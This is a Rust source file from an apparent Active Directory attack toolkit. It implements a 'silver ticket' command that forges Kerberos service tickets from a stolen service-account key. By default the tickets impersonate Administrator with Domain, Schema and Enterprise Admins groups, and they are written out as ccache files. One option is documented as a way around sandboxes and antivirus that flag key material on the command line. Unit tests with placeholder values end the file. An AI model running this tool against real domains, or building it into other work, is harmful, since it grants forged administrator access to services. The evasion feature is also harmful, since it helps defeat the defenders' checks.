//! Silver ticket: forge a service ticket (TGS) for an SPN with the target
//! service account's AES256 key. Bypasses the KDC entirely at presentation.

use crate::ui;
use anyhow::{Context, Result};
use clap::Parser;

#[derive(Parser)]
pub(crate) struct SilverArgs {
    /// Read every argument from an INI-style KEY=VALUE file instead of the
    /// command line. Useful in environments where the caller's process
    /// harness rejects command-line launches that carry raw key material in
    /// argv (some sandboxes / AV pattern-match on `--service-aes256 <hex>`).
    /// Keys: `realm`, `service_aes256`, `rc4`, `spn`, `domain_sid` (one per
    /// line; lines starting with `#` are comments). `env:VAR` / `@file:PATH`
    /// still work for `service_aes256`.
    #[arg(long, value_name = "PATH")]
    pub from_file: Option<String>,
    /// Kerberos realm (e.g. CORP.LOCAL).
    #[arg(long)]
    pub realm: Option<String>,
    /// Service key: AES256 (64 hex) by default, or the RC4/NT hash (32 hex) with --rc4.
    #[arg(long)]
    pub service_aes256: Option<adhammer_core::SecretString>,
    /// Forge an RC4-HMAC (etype 23) ticket — interpret the key as the service NT hash (legacy DCs).
    #[arg(long)]
    pub rc4: bool,
    /// Target SPN(s) — one or more, comma-separated
    /// (e.g. `cifs/dc01.corp.local,http/dc01.corp.local`). When multiple
    /// SPNs are given AND `--out <path>` is set, each ticket lands at
    /// `<path>.<spn-slug>.ccache`; a single SPN keeps the old `<path>` behaviour.
    #[arg(long, value_delimiter = ',')]
    pub spn: Vec<String>,
    /// Domain SID (S-1-5-21-a-b-c).
    #[arg(long)]
    pub domain_sid: Option<String>,
    /// Identity to impersonate (default Administrator).
    #[arg(long, default_value = "Administrator")]
    pub user: String,
    /// RID of the impersonated account (default 500).
    #[arg(long, default_value_t = 500)]
    pub rid: u32,
    /// Group RIDs to embed (default: Users + Domain/Schema/Enterprise Admins + GPO Creators).
    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
    pub groups: Vec<u32>,
    /// Write the forged service ticket to this ccache path.
    #[arg(long)]
    pub out: Option<String>,
}

/// Silver ticket: forge a service ticket (TGS) for an SPN, sealed + PAC-signed with the target
/// service account's AES256 key. Presented directly to the service (AP-REQ) without the KDC —
/// so the KDC signature is unchecked. Emits a ccache for use with `-k` / KRB5CCNAME tooling.
///
/// Wraps `silver_impl` with a per-stage checklist ("parse service key → parse domain SID → forge
/// silver TGS → write ccache") so the operator sees which step failed (bad key hex, malformed SID,
/// forge error).
pub(crate) async fn silver(a: SilverArgs) -> Result<()> {
    let cfg = match a.from_file.as_deref() {
        Some(p) => load_silver_ini(p)?.overlay(&a)?,
        None => SilverConfig::from_flags(&a)?,
    };
    let mut checklist = ui::StageChecklist::new([
        "parse service key",
        "parse domain SID",
        "forge silver TGS",
        "write ccache",
    ]);
    let result = silver_impl(cfg, &mut checklist).await;
    match &result {
        Ok(()) => checklist.render("Silver stages"),
        Err(e) => {
            let brief = format!("{e:#}")
                .lines()
                .next()
                .unwrap_or("failed")
                .chars()
                .take(80)
                .collect::<String>();
            checklist.mark_current_failed(brief);
            checklist.render("Silver stages (failed)");
        }
    }
    result
}

async fn silver_impl(cfg: SilverConfig, checklist: &mut ui::StageChecklist) -> Result<()> {
    use adhammer_kerberos::pac::ForgeIdentity;

    let key = crate::parse_forge_key(cfg.service_aes256.expose_secret(), cfg.rc4)?;
    checklist.record_ok(
        "parse service key",
        if cfg.rc4 {
            "RC4-HMAC (NT hash)"
        } else {
            "AES256-CTS-HMAC-SHA1-96"
        },
    );
    let subs: Vec<u32> = cfg
        .domain_sid
        .trim_start_matches("S-1-5-")
        .split('-')
        .map(|x| x.parse::<u32>())
        .collect::<std::result::Result<_, _>>()
        .context("--domain-sid must be S-1-5-21-a-b-c")?;
    checklist.record_ok("parse domain SID", format!("→ {}", cfg.domain_sid));

    let id = ForgeIdentity {
        user: cfg.user.clone(),
        rid: cfg.rid,
        primary_gid: 513,
        group_rids: cfg.groups.clone(),
        domain_subauths: subs,
        logon_server: cfg.realm.split('.').next().unwrap_or("DC").to_uppercase(),
        logon_domain: cfg
            .realm
            .split('.')
            .next()
            .unwrap_or("DOMAIN")
            .to_uppercase(),
        extra_sids: vec![],
    };
    // Stream 7 / silver-multi-SPN: loop the forge per SPN. Same key, same identity —
    // one call to forge_silver_tgt per SPN. `--out <path>` writes `<path>` for the
    // first SPN when only one is given (backwards compatibility) and `<path>.<slug>.ccache`
    // when multiple are given so scripts can pick the SPN they want.
    let mut forged = 0usize;
    let mut ccaches = 0usize;
    let multi = cfg.spns.len() > 1;
    for (i, spn) in cfg.spns.iter().enumerate() {
        let tgt = adhammer_kerberos::forge_silver_tgt(&id, &cfg.realm, &key, spn, cfg.rc4)?;
        forged += 1;
        println!(
            "[+] forged silver ticket: {}@{} for {} (rid {})",
            cfg.user, cfg.realm, spn, cfg.rid
        );
        if let Some(base) = &cfg.out {
            let cc = adhammer_kerberos::silver_ccache(&tgt, &cfg.user, spn)?;
            let path = if multi {
                format!("{base}.{}.ccache", spn_slug(spn))
            } else {
                base.clone()
            };
            adhammer_core::write_secret_artifact(
                std::path::Path::new(&path),
                adhammer_core::SecretArtifact::Ccache,
                &cc,
            )?;
            println!("[+] wrote ccache → {path} ({} bytes)", cc.len());
            ccaches += 1;
        }
        let _ = i;
    }
    checklist.record_ok(
        "forge silver TGS",
        format!("{}@{} for {} SPN(s)", cfg.user, cfg.realm, forged),
    );
    checklist.record_ok(
        "write ccache",
        if cfg.out.is_some() {
            format!("{ccaches} ccache(s) written")
        } else {
            "skipped (no --out)".to_string()
        },
    );
    Ok(())
}

/// Slug an SPN so `cifs/dc.corp.local` becomes `cifs-dc.corp.local` — safe for a
/// filename, still readable, one-to-one with the SPN.
fn spn_slug(spn: &str) -> String {
    spn.replace(['/', '\\', ':'], "-")
}

#[derive(Debug)]
struct SilverConfig {
    realm: String,
    service_aes256: adhammer_core::SecretString,
    rc4: bool,
    spns: Vec<String>,
    domain_sid: String,
    user: String,
    rid: u32,
    groups: Vec<u32>,
    out: Option<String>,
}

impl SilverConfig {
    fn from_flags(a: &SilverArgs) -> Result<Self> {
        let service_aes256 = match &a.service_aes256 {
            Some(k) => crate::resolve_secret(k, "ADHAMMER_PASSWORD")?,
            None => anyhow::bail!("--service-aes256 required (or use --from-file)"),
        };
        if a.spn.is_empty() {
            anyhow::bail!("--spn required (or use --from-file)");
        }
        Ok(Self {
            realm: a
                .realm
                .clone()
                .ok_or_else(|| anyhow::anyhow!("--realm required (or use --from-file)"))?,
            service_aes256,
            rc4: a.rc4,
            spns: a.spn.clone(),
            domain_sid: a
                .domain_sid
                .clone()
                .ok_or_else(|| anyhow::anyhow!("--domain-sid required (or use --from-file)"))?,
            user: a.user.clone(),
            rid: a.rid,
            groups: a.groups.clone(),
            out: a.out.clone(),
        })
    }
}

#[derive(Debug)]
struct SilverFile {
    realm: Option<String>,
    service_aes256: Option<String>,
    rc4: Option<bool>,
    spn: Option<String>,
    domain_sid: Option<String>,
}

impl SilverFile {
    fn overlay(self, a: &SilverArgs) -> Result<SilverConfig> {
        let take =
            |from_file: Option<String>, from_flag: Option<String>, name: &str| -> Result<String> {
                from_flag.or(from_file).ok_or_else(|| {
                    anyhow::anyhow!("{name} missing in both --from-file and CLI flags")
                })
            };
        let key_raw = a
            .service_aes256
            .as_ref()
            .map(|s| s.expose_secret().to_string())
            .or(self.service_aes256)
            .ok_or_else(|| {
                anyhow::anyhow!("service_aes256 missing in both --from-file and CLI flags")
            })?;
        let service_aes256 = crate::resolve_secret(key_raw.as_str(), "ADHAMMER_PASSWORD")?;
        // silver-multi-SPN: CLI --spn wins if non-empty, otherwise the INI `spn`
        // key is comma-split. Same grammar either way.
        let spns: Vec<String> = if !a.spn.is_empty() {
            a.spn.clone()
        } else {
            self.spn
                .ok_or_else(|| anyhow::anyhow!("spn missing in both --from-file and CLI flags"))?
                .split(',')
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty())
                .collect()
        };
        if spns.is_empty() {
            anyhow::bail!("spn resolved to empty list");
        }
        Ok(SilverConfig {
            realm: take(self.realm, a.realm.clone(), "realm")?,
            service_aes256,
            rc4: a.rc4 || self.rc4.unwrap_or(false),
            spns,
            domain_sid: take(self.domain_sid, a.domain_sid.clone(), "domain_sid")?,
            user: a.user.clone(),
            rid: a.rid,
            groups: a.groups.clone(),
            out: a.out.clone(),
        })
    }
}

fn load_silver_ini(path: &str) -> Result<SilverFile> {
    use anyhow::Context;
    let text = std::fs::read_to_string(path).with_context(|| format!("read --from-file {path}"))?;
    let mut f = SilverFile {
        realm: None,
        service_aes256: None,
        rc4: None,
        spn: None,
        domain_sid: None,
    };
    for (n, line) in text.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let (k, v) = line
            .split_once('=')
            .ok_or_else(|| anyhow::anyhow!("{path}:{}: expected KEY=VALUE", n + 1))?;
        let v = v.trim().to_string();
        match k.trim() {
            "realm" => f.realm = Some(v),
            "service_aes256" => f.service_aes256 = Some(v),
            "rc4" => {
                f.rc4 =
                    Some(v.parse::<bool>().map_err(|_| {
                        anyhow::anyhow!("{path}:{}: rc4 must be true|false", n + 1)
                    })?);
            }
            "spn" => f.spn = Some(v),
            "domain_sid" => f.domain_sid = Some(v),
            other => anyhow::bail!("{path}:{}: unknown key `{other}`", n + 1),
        }
    }
    Ok(f)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmp_ini(name: &str, body: &str) -> String {
        let dir = std::env::temp_dir();
        let path = dir.join(format!(
            "adhammer_silver_{}_{}_{}.ini",
            name,
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or(0)
        ));
        std::fs::write(&path, body).unwrap();
        path.to_string_lossy().into_owned()
    }

    fn empty_args() -> SilverArgs {
        SilverArgs {
            from_file: None,
            realm: None,
            service_aes256: None,
            rc4: false,
            spn: vec![],
            domain_sid: None,
            user: "Administrator".to_string(),
            rid: 500,
            groups: vec![513, 512, 520, 518, 519],
            out: None,
        }
    }

    #[test]
    fn ini_parses_valid_keys() {
        let path = tmp_ini(
            "valid",
            "# a comment\n\
             realm=CORP.LOCAL\n\
             service_aes256=deadbeef\n\
             rc4=true\n\
             spn=cifs/dc01.corp.local\n\
             domain_sid=S-1-5-21-1-2-3\n",
        );
        let f = load_silver_ini(&path).unwrap();
        assert_eq!(f.realm.as_deref(), Some("CORP.LOCAL"));
        assert_eq!(f.service_aes256.as_deref(), Some("deadbeef"));
        assert_eq!(f.rc4, Some(true));
        assert_eq!(f.spn.as_deref(), Some("cifs/dc01.corp.local"));
        assert_eq!(f.domain_sid.as_deref(), Some("S-1-5-21-1-2-3"));
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn ini_unknown_key_errors() {
        let path = tmp_ini("unknown", "realm=X\nbogus_key=1\n");
        let err = load_silver_ini(&path).unwrap_err().to_string();
        assert!(err.contains("unknown key"), "err was {err:?}");
        assert!(err.contains("bogus_key"), "err was {err:?}");
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn cli_flag_beats_ini_value() {
        let path = tmp_ini(
            "beat",
            "realm=INI.LOCAL\n\
             service_aes256=aa\n\
             spn=ini/spn\n\
             domain_sid=S-1-5-21-9-9-9\n",
        );
        let f = load_silver_ini(&path).unwrap();
        let mut a = empty_args();
        a.spn = vec!["cli/spn".to_string()];
        let cfg = f.overlay(&a).unwrap();
        assert_eq!(cfg.spns, vec!["cli/spn".to_string()]);
        assert_eq!(cfg.realm, "INI.LOCAL");
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn multi_spn_from_ini_comma_split() {
        // Stream 7 / silver-multi-SPN: INI `spn=` accepts a comma-separated list and
        // yields multiple ccache targets. Regression guard: the loop must forge one
        // ticket per SPN, not concatenate them into a single principal name.
        let path = tmp_ini(
            "multi",
            "realm=CORP.LOCAL\n\
             service_aes256=aa\n\
             spn=cifs/dc01.corp.local,http/dc01.corp.local,ldap/dc01.corp.local\n\
             domain_sid=S-1-5-21-1-2-3\n",
        );
        let f = load_silver_ini(&path).unwrap();
        let a = empty_args();
        let cfg = f.overlay(&a).unwrap();
        assert_eq!(cfg.spns.len(), 3);
        assert_eq!(cfg.spns[0], "cifs/dc01.corp.local");
        assert_eq!(cfg.spns[2], "ldap/dc01.corp.local");
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn spn_slug_strips_forbidden_filename_chars() {
        assert_eq!(spn_slug("cifs/dc01.corp.local"), "cifs-dc01.corp.local");
        assert_eq!(spn_slug("http/dc01"), "http-dc01");
        assert_eq!(spn_slug("mssql:host"), "mssql-host");
    }

    #[test]
    fn missing_required_key_errors() {
        let path = tmp_ini(
            "missing",
            "# no realm here\n\
             service_aes256=aa\n\
             spn=cifs/x\n\
             domain_sid=S-1-5-21-1-2-3\n",
        );
        let f = load_silver_ini(&path).unwrap();
        let a = empty_args();
        let err = f.overlay(&a).unwrap_err().to_string();
        assert!(err.contains("realm"), "err was {err:?}");
        let _ = std::fs::remove_file(&path);
    }
}
